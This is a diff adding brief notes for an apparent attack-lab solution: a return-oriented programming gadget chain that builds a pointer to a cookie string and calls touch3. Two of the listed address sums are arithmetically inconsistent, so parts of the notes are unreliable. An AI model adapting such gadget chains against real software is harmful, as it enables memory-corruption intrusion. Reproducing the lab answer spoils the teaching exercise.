@@ -1,0 +1,12 @@
+0x402286 + 7 movq %rsp,%rax = 0x40228d
+0x40219e + 6 movq %rax,%rdi = 0x4021a4
+0x4021b4 + 8 popq %rax = 0x4021bc
+constant $0x48
+0x4022a7 + 7 mov %eax,%ecx = 0x4022ad
+0x4022ec + 3 mov %ecx,%edx = 0x4022ee
+0x40227b + 6 mov %edx,%esi = 0x402281
+0x4021f5 + 4 leaq (%rdi, %rsi, 1),%rax = 0x4021f9
+0x40219e + 6 movq %rax,%rdi = 0x4021a4
+touch3
+cookie
+end0
